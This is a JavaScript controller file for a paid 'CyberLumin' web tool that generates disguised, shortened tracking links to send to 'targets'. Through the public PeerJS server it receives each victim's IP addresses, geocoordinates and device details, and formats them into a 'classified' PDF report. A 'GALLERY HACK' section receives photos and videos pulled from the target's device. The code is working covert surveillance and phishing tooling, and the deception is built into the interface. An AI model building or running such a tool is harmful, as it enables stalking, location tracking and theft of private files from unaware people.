        <div style="flex:1;background:#071018;border:1px solid #0e2030;border-radius:8px;padding:14px;">
          <div style="font-size:10px;font-weight:700;color:#00f0ff;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #0e2030;">📡 Network & Location</div>
          <table style="width:100%;border-collapse:collapse;font-size:10px;">
            <tr><td style="padding:5px 0;color:#5a7a8a;width:45%;">IPv4 Public</td><td style="color:#fff;font-family:monospace;">${esc(ipv4)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">IPv6</td><td style="color:#fff;font-family:monospace;font-size:9px;">${esc(t.ipv6 || 'Not detected')}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Private IP</td><td style="color:#fff;font-family:monospace;">${esc(t.private_ip || 'Not detected')}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Connection</td><td style="color:#fff;">${esc(t.connection)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Country</td><td style="color:#fff;">${esc(t.country)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">City / Region</td><td style="color:#fff;">${esc(t.city)}, ${esc(t.region)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Postal</td><td style="color:#fff;">${esc(t.postal)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Timezone</td><td style="color:#fff;">${esc(t.timezone)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Coordinates</td><td style="color:#00f0ff;font-family:monospace;">${esc(coords)}</td></tr>
          </table>
        </div>

        <!-- Device & Browser -->
        <div style="flex:1;background:#071018;border:1px solid #0e2030;border-radius:8px;padding:14px;">
          <div style="font-size:10px;font-weight:700;color:#00f0ff;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #0e2030;">💻 Device & Browser</div>
          <table style="width:100%;border-collapse:collapse;font-size:10px;">
            <tr><td style="padding:5px 0;color:#5a7a8a;width:45%;">Device Type</td><td style="color:#fff;">${esc(t.device)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">OS</td><td style="color:#fff;">${esc(t.os)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Browser</td><td style="color:#fff;">${esc(t.browser)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Screen</td><td style="color:#fff;font-family:monospace;">${esc(t.screen)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Language</td><td style="color:#fff;">${esc(t.language)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Platform</td><td style="color:#fff;">${esc(t.platform)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">CPU Cores</td><td style="color:#fff;">${t.cores ? esc(t.cores)+' cores' : '—'}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Memory</td><td style="color:#fff;">${esc(t.memory)}</td></tr>
            <tr><td style="padding:5px 0;color:#5a7a8a;">Battery</td><td style="color:#fff;">${esc(t.battery)}</td></tr>
          </table>
        </div>
      </div>

      <!-- User Agent -->
      <div style="background:#071018;border:1px solid #0e2030;border-radius:8px;padding:12px;margin-bottom:16px;">
        <div style="font-size:9px;color:#00f0ff;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;">Raw User-Agent String</div>
        <div style="font-size:9px;color:#5a7a8a;font-family:monospace;word-break:break-all;line-height:1.5;border-left:2px solid #00f0ff;padding-left:8px;">${esc(t.ua)}</div>
      </div>

      <!-- Footer -->
      <div style="display:flex;justify-content:space-between;font-size:8px;color:#2a4a5a;border-top:1px solid #0e2030;padding-top:10px;">
        <span>CyberLumin Intelligence Platform</span>
        <span>DOCUMENT CLASSIFIED // INTERNAL USE ONLY</span>
        <span>REF: ${refId}</span>
      </div>
    </div>
  `;

  document.body.appendChild(wrap);
  await new Promise(r => setTimeout(r, 200));

  const opt = {
    margin: 0.3,
    filename: `CyberLumin_Target${t._id + 1}_${ipv4.replace(/\./g,'-')}.pdf`,
    image: { type: 'jpeg', quality: 0.97 },
    html2canvas: { scale: 2, useCORS: true, backgroundColor: '#060c14', logging: false },
    jsPDF: { unit: 'in', format: 'a4', orientation: 'portrait' }
  };

  try {
    await html2pdf().set(opt).from(wrap).save();
  } catch(e) {
    console.error('PDF error:', e);
    alert('PDF generation failed. Try again.');
  } finally {
    document.body.removeChild(wrap);
    if (btn) { btn.innerHTML = '📄 Download PDF'; btn.disabled = false; }
  }
}



function setIpStatus(msg, type) {
  const bar = document.getElementById('ip-status-bar');
  const txt = document.getElementById('ip-status-text');
  if (txt) txt.textContent = msg;
  if (bar) bar.className = 'llg-status-bar' + (type ? ' ' + type : '');
}

function setIpPeerDot(state, label) {
  const dot = document.getElementById('ip-peer-dot');
  const lbl = document.getElementById('ip-peer-label');
  if (dot) dot.className = 'peer-dot ' + state;
  if (lbl) lbl.textContent = label;
}

function unlockIpStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '1'; el.style.pointerEvents = 'auto'; el.classList.add('unlocked'); }
}

function lockIpStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '.4'; el.style.pointerEvents = 'none'; el.classList.remove('unlocked'); }
}

async function generateIpLink() {
  // Deduct 20 credits — each Generate Link costs 20
  const ok = await deductCredit('generate_link');
  if (!ok) return;
  if (ipPeer) { ipPeer.destroy(); ipPeer = null; }

  // Custom peerId — same approach as Location tracker
  const peerId = 'nxip-' + Math.random().toString(36).substr(2, 9);
  setIpStatus('⏳ Initializing...', 'waiting');
  setIpPeerDot('waiting', 'INIT');

  try {
    ipPeer = new Peer(peerId, {
      host:'0.peerjs.com', port:443, path:'/', secure:true,
      config:{ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] }
    });
  } catch(e) {
    ipPeer = new Peer(peerId);
  }

  ipPeer.on('open', function(id) {
    // Build URL same way as Location (reliable on all hosting setups)
    const base = location.origin + location.pathname.replace(/\/(index\.(html|php))?$/, '');
    ipRawLink = base + '/ip-track.html?host=' + id;

    document.getElementById('ip-final-link').value = ipRawLink;

    // Show Reset, hide Generate
    document.getElementById('btn-gen-ip').style.display = 'none';
    document.getElementById('btn-reset-ip').style.display = 'inline-block';

    // Unlock Step 2 & 3
    unlockIpStep('ip-step2');
    unlockIpStep('ip-step3');

    setIpPeerDot('waiting', 'WAITING');
    setIpStatus('✅ Link ready! Set a redirect URL (Step 2), then copy and send to target.', 'waiting');
  });

  ipPeer.on('connection', function(conn) {
    setIpPeerDot('connected', 'CONNECTED');
    setIpStatus('🔴 Target connected! Extracting IP data...', 'active');

    conn.on('data', function(raw) {
      try {
        const msg = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (msg.type === 'ip_track') {
          // Notification beep
          try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain); gain.connect(ctx.destination);
            osc.frequency.setValueAtTime(880, ctx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(1760, ctx.currentTime + 0.1);
            gain.gain.setValueAtTime(0.5, ctx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
            osc.start(); osc.stop(ctx.currentTime + 0.3);
          } catch(e) {}

          setIpStatus('📍 IP captured! ' + (msg.ipv4||msg.ip||'?') + ' | ' + (msg.city||'') + ', ' + (msg.country||''), 'active');

          // Add to targets list
          addTargetToList(msg);

          // ── IP Addresses ──
          const ipv4 = msg.ipv4 || msg.ip || '—';
          document.getElementById('my-ip').textContent         = ipv4;
          document.getElementById('ip-type-badge').textContent = msg.ip_type || 'IPv4';
          document.getElementById('ip-ipv4').textContent       = ipv4;
          document.getElementById('ip-ipv6').textContent       = msg.ipv6 || 'Not detected (IPv4 only network)';
          document.getElementById('ip-private').textContent    = msg.private_ip || 'Not detected (no WebRTC)';
          document.getElementById('ip-org').textContent        = msg.org || '—';
          document.getElementById('ip-asn').textContent        = msg.asn || '—';
          document.getElementById('ip-connection').textContent = msg.connection || '—';

          // ── Location ──
          document.getElementById('ip-country').textContent = msg.country || '—';
          document.getElementById('ip-city').textContent    = msg.city || '—';
          document.getElementById('ip-region').textContent  = msg.region || '—';
          document.getElementById('ip-postal').textContent  = msg.postal || '—';
          document.getElementById('ip-tz').textContent      = msg.timezone || '—';
          if (msg.lat && msg.lon) {
            document.getElementById('ip-coords').textContent = parseFloat(msg.lat).toFixed(5) + ', ' + parseFloat(msg.lon).toFixed(5);
          }

          // ── Device & Browser ──
          document.getElementById('ip-device').textContent   = msg.device || '—';
          document.getElementById('ip-os').textContent       = msg.os || '—';
          document.getElementById('ip-browser').textContent  = msg.browser || '—';
          document.getElementById('ip-screen').textContent   = msg.screen || '—';
          document.getElementById('ip-lang').textContent     = msg.language || '—';
          document.getElementById('ip-platform').textContent = msg.platform || '—';
          document.getElementById('ip-cores').textContent    = msg.cores ? msg.cores + ' cores' : '—';
          document.getElementById('ip-memory').textContent   = msg.memory || '—';
          document.getElementById('ip-touch').textContent    = msg.touch || '—';
          document.getElementById('ip-battery').textContent  = msg.battery || '—';
          document.getElementById('ip-cookies').textContent  = msg.cookies || '—';
          document.getElementById('ip-dnt').textContent      = msg.dnt || '—';
          document.getElementById('ip-ua').textContent       = msg.ua || '—';

          animateThreatBars();
        }
      } catch(e) {}
    });

    conn.on('close', function() {
      // One target left — but keep peer alive for MORE targets
      const n = capturedTargets.length;
      setIpPeerDot('waiting', 'WAITING');
      setIpStatus('✅ Target #' + n + ' data saved. Waiting for more targets…', 'waiting');
    });
  });

  ipPeer.on('error', function(err) {
    // Peer-unavailable: target tried to connect but we weren't reachable — auto-reconnect
    if (err.type === 'peer-unavailable') return;
    setIpStatus('❌ Error: ' + err.type + ' — Reconnecting...', '');
    setIpPeerDot('offline', 'ERROR');
    // Try to recover
    if (!ipPeer.destroyed) {
      setTimeout(() => { try { ipPeer.reconnect(); } catch(e) {} }, 2000);
    }
  });

  // ── Auto-reconnect when PeerJS server drops the connection ──
  // The free 0.peerjs.com server disconnects idle peers after ~60s.
  // Without this, only the FIRST user's data arrives.
  ipPeer.on('disconnected', function() {
    setIpPeerDot('waiting', 'RECONNECTING...');
    setIpStatus('🔄 Reconnecting to peer server… (link still active)', 'waiting');
    try { if (!ipPeer.destroyed) ipPeer.reconnect(); } catch(e) {}
  });

  // ── Keepalive: ping every 25s to prevent server idle-timeout ──
  if (window._ipKeepAlive) clearInterval(window._ipKeepAlive);
  window._ipKeepAlive = setInterval(() => {
    if (!ipPeer || ipPeer.destroyed) { clearInterval(window._ipKeepAlive); return; }
    if (ipPeer.disconnected) {
      try { ipPeer.reconnect(); } catch(e) {}
    }
  }, 25000);
}

function resetIpLink() {
  if (window._ipKeepAlive) { clearInterval(window._ipKeepAlive); window._ipKeepAlive = null; }
  if (ipPeer) { ipPeer.destroy(); ipPeer = null; }
  ipRawLink = '';
  document.getElementById('ip-final-link').value = '';
  document.getElementById('btn-gen-ip').style.display = 'inline-block';
  document.getElementById('btn-reset-ip').style.display = 'none';
  
  lockIpStep('ip-step2');
  lockIpStep('ip-step3');
  lockIpStep('ip-step4');
  
  const disguiseInput = document.getElementById('ip-redirect-url');
  if (disguiseInput) disguiseInput.value = '';
  const preview = document.getElementById('ip-redirect-preview');
  if (preview) preview.style.display = 'none';
  const si = document.getElementById('ip-short-link');
  if (si) si.value = '';
  const cs = document.getElementById('btn-copy-ip-short');
  if (cs) cs.style.display = 'none';
  const ss = document.getElementById('ip-shorten-status');
  if (ss) ss.textContent = '';
  
  setIpPeerDot('offline', 'IDLE');
  setIpStatus('Click "Generate Link" to begin', '');
}

function applyIpRedirect() {
  const url = document.getElementById('ip-redirect-url').value.trim();
  if (!url) { setIpStatus('⚠️ Please enter a redirect URL first.', 'waiting'); return; }
  const fullUrl = url.startsWith('http') ? url : 'https://' + url;
  
  const finalLink = ipRawLink + '&redirect=' + encodeURIComponent(fullUrl);
  document.getElementById('ip-final-link').value = finalLink;
  document.getElementById('ip-redirect-preview').style.display = 'block';
  document.getElementById('ip-redirect-show').textContent = fullUrl;
  setIpStatus('✅ Disguise set → ' + fullUrl + ' | Now click Hide to generate a safe link.', 'active');

  unlockIpStep('ip-step4');
  
  const si = document.getElementById('ip-short-link');
  if (si) si.value = '';
  const cs = document.getElementById('btn-copy-ip-short');
  if (cs) {
    cs.disabled = true;
    cs.style.opacity = '.4';
    cs.style.cursor = 'not-allowed';
  }
  const ss = document.getElementById('ip-shorten-status');
  if (ss) { ss.textContent = ''; ss.style.color = '#888'; }
}

async function shortenIpLink() {
  const longUrl = document.getElementById('ip-final-link').value.trim();
  if (!longUrl) {
    setIpStatus('⚠️ Apply a disguise URL first (Step 2), then click Hide.', 'waiting');
    return;
  }

  const btn       = document.getElementById('btn-hide-ip');
  const statusEl  = document.getElementById('ip-shorten-status');
  const shortInput = document.getElementById('ip-short-link');
  const copyBtn   = document.getElementById('btn-copy-ip-short');

  if (btn) { btn.textContent = '⏳ Hiding...'; btn.disabled = true; }
  if (copyBtn) { copyBtn.disabled = true; copyBtn.style.opacity = '.4'; copyBtn.style.cursor = 'not-allowed'; }
  statusEl.textContent = '⏳ Generating anonymous link...';
  statusEl.style.color = '#888';
  unlockIpStep('ip-step4');

  const shortUrl = await _shortenUrl(longUrl);

  if (btn) { btn.textContent = '🔖 Hide'; btn.disabled = false; }

  if (shortUrl) {
    shortInput.value = shortUrl;
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    statusEl.textContent = '✅ Hidden! Your domain is invisible — send this to target.';
    statusEl.style.color = '#00f0ff';
    setIpStatus('🔗 Hidden: ' + shortUrl + ' | Copy and send to target.', 'active');
  } else {
    shortInput.value = longUrl;
    statusEl.innerHTML = '⚠️ Auto-hide failed. <a href="https://tinyurl.com/create.php" target="_blank" style="color:#00f0ff">Open TinyURL →</a> paste the Step 3 link manually.';
    statusEl.style.color = '#ffaa00';
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    setIpStatus('⚠️ Auto-hide failed — use TinyURL manually.', 'waiting');
  }
}

function copyIpShortLink() {
  const link = document.getElementById('ip-short-link').value;
  if (!link) return;
  navigator.clipboard.writeText(link).then(function() {
    const btn = document.getElementById('btn-copy-ip-short');
    btn.textContent = '✅ Copied!';
    setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
    setIpStatus('📋 Link copied! Send it to the target...', 'waiting');
  }).catch(function() {
    document.getElementById('ip-short-link').select();
    document.execCommand('copy');
  });
}


// =====================================================
// GALLERY HACK — Remote Gallery Link Generator
// =====================================================
let galleryPeer    = null;
let galleryRawLink = '';
let receivedFiles  = [];   // {name, mime, size, dataUrl, ts}

// ── helpers ──────────────────────────────────────────
function setGLGStatus(msg, type) {
  const bar = document.getElementById('glg-status-bar');
  const txt = document.getElementById('glg-status-text');
  if (txt) txt.textContent = msg;
  if (bar) bar.className = 'llg-status-bar' + (type ? ' ' + type : '');
  const dot = document.getElementById('glg-peer-dot');
  const lbl = document.getElementById('glg-peer-label');
  if (dot) dot.className = 'peer-dot ' + (type === 'active' ? 'connected' : type === 'waiting' ? 'waiting' : 'offline');
  if (lbl) lbl.textContent = type === 'active' ? 'CONNECTED' : type === 'waiting' ? 'WAITING' : 'IDLE';
}

function unlockGLGStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '1'; el.style.pointerEvents = 'auto'; }
}
function lockGLGStep(id) {
  const el = document.getElementById(id);
  if (el) { el.style.opacity = '.4'; el.style.pointerEvents = 'none'; }
}

// ── Step 1: Generate Link ─────────────────────────────
async function generateGalleryLink() {
  // Deduct 20 credits — each Generate Link costs 20
  const ok = await deductCredit('generate_link');
  if (!ok) return;
  if (galleryPeer) { galleryPeer.destroy(); galleryPeer = null; }

  const peerId = 'nxgal-' + Math.random().toString(36).substr(2, 9);
  const base   = location.origin + location.pathname.replace(/\/(index\.(html|php))?$/, '');
  galleryRawLink = base + '/gallery-link.html?host=' + peerId;

  document.getElementById('glg-final-link').value = galleryRawLink;
  document.getElementById('btn-gen-gallery').style.display = 'none';
  document.getElementById('btn-reset-gallery').style.display = 'inline-block';
  unlockGLGStep('glg-step2');
  unlockGLGStep('glg-step3');
  setGLGStatus('✅ Link ready! Set a disguise website (Step 2), then Hide and send.', 'waiting');

  try {
    galleryPeer = new Peer(peerId, {
      host:'0.peerjs.com', port:443, path:'/', secure:true,
      config:{ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] }
    });
  } catch(e) { galleryPeer = new Peer(peerId); }

  galleryPeer.on('open', function() {
    setGLGStatus('⏳ Waiting for target to open the link...', 'waiting');
  });

  galleryPeer.on('connection', function(conn) {
    setGLGStatus('🔴 Target connected! Waiting for photo sync...', 'active');

    conn.on('data', function(raw) {
      try {
        const msg = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (msg.type === 'gallery_file' && msg.data) {
          // Play notification
          try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ctx.createOscillator(); const g = ctx.createGain();
            osc.connect(g); g.connect(ctx.destination);
            osc.frequency.setValueAtTime(1200, ctx.currentTime);
            g.gain.setValueAtTime(0.3, ctx.currentTime);
            g.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2);
            osc.start(); osc.stop(ctx.currentTime + 0.2);
          } catch(e) {}

          const file = { name: msg.name || ('photo_'+Date.now()), mime: msg.mime || 'image/jpeg', size: msg.size || 0, dataUrl: msg.data, ts: msg.ts || Date.now() };
          receivedFiles.unshift(file);
          addGalleryReceivedFile(file);
          updateGalleryStatsRemote();
          document.getElementById('gallery-status').textContent = '📸 ' + receivedFiles.length + ' file(s) received from target';
          setGLGStatus('📸 ' + receivedFiles.length + ' photo(s) received! Keep window open for more.', 'active');
        }
      } catch(e) {}
    });

    conn.on('close', function() {
      setGLGStatus('⚠️ Target disconnected. ' + receivedFiles.length + ' file(s) received.', 'waiting');
    });
  });

  galleryPeer.on('error', function(err) {
    setGLGStatus('❌ Peer error: ' + err.type + '. Try resetting.', '');
  });

  galleryPeer.on('disconnected', function() {
    galleryPeer.reconnect();
  });
}

// ── Step 2: Apply disguise redirect ──────────────────
function applyGalleryRedirect() {
  const url = document.getElementById('glg-redirect').value.trim();
  if (!url) { setGLGStatus('⚠️ Enter a disguise URL first.', 'waiting'); return; }
  const fullUrl = url.startsWith('http') ? url : 'https://' + url;
  const finalLink = galleryRawLink + '&redirect=' + encodeURIComponent(fullUrl);
  document.getElementById('glg-final-link').value = finalLink;

  const prev = document.getElementById('glg-redirect-preview');
  const show = document.getElementById('glg-redirect-show');
  if (prev) prev.style.display = 'block';
  if (show) show.textContent = fullUrl;

  unlockGLGStep('glg-step4');
  setGLGStatus('✅ Disguise set → ' + fullUrl + ' | Now click Hide to mask the link.', 'active');
}

// ── Step 3: Shorten / Hide link ───────────────────────
async function shortenGalleryLink() {
  const longUrl = document.getElementById('glg-final-link').value.trim();
  if (!longUrl) { setGLGStatus('⚠️ Apply a disguise URL first (Step 2).', 'waiting'); return; }

  const btn     = document.getElementById('btn-hide-gallery');
  const statusEl = document.getElementById('glg-shorten-status');
  const shortIn  = document.getElementById('glg-short-link');
  const copyBtn  = document.getElementById('btn-copy-gallery-short');

  if (btn)     { btn.textContent = '⏳ Hiding...'; btn.disabled = true; }
  if (copyBtn) { copyBtn.disabled = true; copyBtn.style.opacity = '.4'; copyBtn.style.cursor = 'not-allowed'; }
  statusEl.textContent = '⏳ Shortening link...';
  statusEl.style.color = '#888';
  unlockGLGStep('glg-step4');

  const shortUrl = await _shortenUrl(longUrl);

  if (btn) { btn.textContent = '🔖 Hide'; btn.disabled = false; }

  if (shortUrl) {
    shortIn.value = shortUrl;
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    statusEl.textContent = '✅ Hidden! Send this to target.';
    statusEl.style.color = '#00f0ff';
    setGLGStatus('🔗 Ready: ' + shortUrl + ' | Copy and send to target.', 'waiting');
  } else {
    shortIn.value = longUrl;
    statusEl.innerHTML = '⚠️ Auto-shorten failed. <a href="https://tinyurl.com/create.php" target="_blank" style="color:#00f0ff">Open TinyURL →</a>';
    statusEl.style.color = '#ffaa00';
    copyBtn.disabled = false; copyBtn.style.opacity = '1'; copyBtn.style.cursor = 'pointer';
    setGLGStatus('⚠️ Auto-shorten failed — use TinyURL manually.', 'waiting');
  }
}

// ── Copy short link ───────────────────────────────────
function copyGalleryShortLink() {
  const link = document.getElementById('glg-short-link').value;
  if (!link) return;
  navigator.clipboard.writeText(link).then(function() {
    const btn = document.getElementById('btn-copy-gallery-short');
    btn.textContent = '✅ Copied!';
    setTimeout(function() { btn.textContent = '📋 Copy'; }, 2000);
    setGLGStatus('📋 Link copied! Waiting for target to open it...', 'waiting');
  }).catch(function() {
    document.getElementById('glg-short-link').select();
    document.execCommand('copy');
  });
}

// ── Reset ─────────────────────────────────────────────
function resetGalleryLink() {
  if (galleryPeer) { galleryPeer.destroy(); galleryPeer = null; }
  galleryRawLink = '';
  document.getElementById('glg-final-link').value = '';
  document.getElementById('glg-short-link').value = '';
  document.getElementById('glg-shorten-status').textContent = '';
  document.getElementById('btn-gen-gallery').style.display = 'inline-block';
  document.getElementById('btn-reset-gallery').style.display = 'none';
  const prev = document.getElementById('glg-redirect-preview');
  if (prev) prev.style.display = 'none';
  lockGLGStep('glg-step2');
  lockGLGStep('glg-step3');
  lockGLGStep('glg-step4');
  setGLGStatus('Click "Generate Link" to begin', '');
}

// ── Add received file to gallery grid ────────────────
function addGalleryReceivedFile(file) {
  const grid = document.getElementById('gallery-grid');
  // Remove empty placeholder
  const empty = grid.querySelector('.gallery-empty');
  if (empty) empty.remove();

  const item = document.createElement('div');
  item.className = 'gallery-item';
  item.setAttribute('data-type', file.mime.startsWith('video') ? 'video' : 'image');
  item.style.animation = 'fadeInScale .3s ease both';

  if (file.mime.startsWith('image')) {
    item.innerHTML = `<img src="${file.dataUrl}" alt="${file.name}" loading="lazy"/>
      <div class="item-overlay">🔍</div>
      <div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,.55);color:#fff;font-size:10px;padding:2px 4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${file.name}</div>`;
    item.onclick = () => openLightbox(file.dataUrl, file.name + ' — ' + (file.size/1024).toFixed(1) + ' KB');
  } else {
    item.innerHTML = `<video src="${file.dataUrl}" style="width:100%;height:100%;object-fit:cover"></video>
      <div class="item-overlay">▶</div>`;
    item.onclick = () => { window.open(file.dataUrl, '_blank'); };
  }

  grid.insertBefore(item, grid.firstChild);
}

// ── Update gallery stats for received files ───────────
function updateGalleryStatsRemote() {
  const imgs  = receivedFiles.filter(f => f.mime.startsWith('image'));
  const vids  = receivedFiles.filter(f => f.mime.startsWith('video'));
  const total = receivedFiles.reduce((a, f) => a + f.size, 0);
  document.getElementById('g-total').textContent  = receivedFiles.length;
  document.getElementById('g-images').textContent = imgs.length;
  document.getElementById('g-videos').textContent = vids.length;
  document.getElementById('g-size').textContent   = (total / 1024 / 1024).toFixed(1) + ' MB';
}

// ── Download all received files ───────────────────────
function downloadAllGallery() {
  if (!receivedFiles.length) { alert('No files received yet.'); return; }
  receivedFiles.forEach((f, i) => {
    setTimeout(() => {
      const a = document.createElement('a');
      a.href = f.dataUrl;
      a.download = f.name || ('gallery_' + i + '.jpg');
      a.click();
    }, i * 300);
  });
}

// ===== PRICING =====

function selectPlan(plan) {
  // Remove selected state from all buttons
  document.querySelectorAll('.plan-btn').forEach(b => b.classList.remove('plan-selected'));

  // Highlight selected plan card
  document.querySelectorAll('.pricing-card').forEach(c => {
    c.style.transform = '';
    c.style.boxShadow = '';
  });

  const card = document.getElementById('plan-' + plan);
  if (card) {
    card.style.transform = 'translateY(-8px) scale(1.02)';
    card.style.boxShadow = '0 12px 40px rgba(0,240,255,0.25)';
    const btn = card.querySelector('.plan-btn');
    if (btn) btn.classList.add('plan-selected');
  }

  // Show toast
  const messages = {
    free:     { text: '🚀 You are on the Free plan — enjoy CyberLumina!', color: '#7b2fff' },
    starter:  { text: '⚡ Starter Plan selected — redirecting to checkout...', color: '#00ff88' },
    pro:      { text: '🌟 Pro Plan selected — redirecting to checkout...', color: '#00f0ff' },
    ultimate: { text: '💎 Ultimate Plan selected — redirecting to checkout...', color: '#00f0ff' },
  };
  const m = messages[plan] || messages.free;
  showPricingToast(m.text, m.color);
}

function showPricingToast(msg, color) {
  // Remove existing toast
  const existing = document.getElementById('pricing-toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.id = 'pricing-toast';
  toast.textContent = msg;
  toast.style.cssText = `
    position:fixed;bottom:2rem;left:50%;transform:translateX(-50%) translateY(20px);
    background:rgba(10,26,36,.95);border:1px solid ${color};border-radius:12px;
    padding:.75rem 1.5rem;font-family:'Share Tech Mono',monospace;font-size:.82rem;
    color:${color};box-shadow:0 0 24px ${color}55;z-index:9999;
    opacity:0;transition:all .4s ease;white-space:nowrap;backdrop-filter:blur(12px);
  `;
  document.body.appendChild(toast);
  requestAnimationFrame(() => {
    toast.style.opacity = '1';
    toast.style.transform = 'translateX(-50%) translateY(0)';
  });
  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(-50%) translateY(20px)';
    setTimeout(() => toast.remove(), 400);
  }, 3000);
}

// ===== INIT =====
window.addEventListener('DOMContentLoaded', () => {
  // Add style for lookup-row
  const style = document.createElement('style');
  style.textContent = `.lookup-row{padding:.25rem 0;border-bottom:1px solid rgba(0,240,255,.06);font-size:.75rem;color:var(--text)}`;
  document.head.appendChild(style);
});
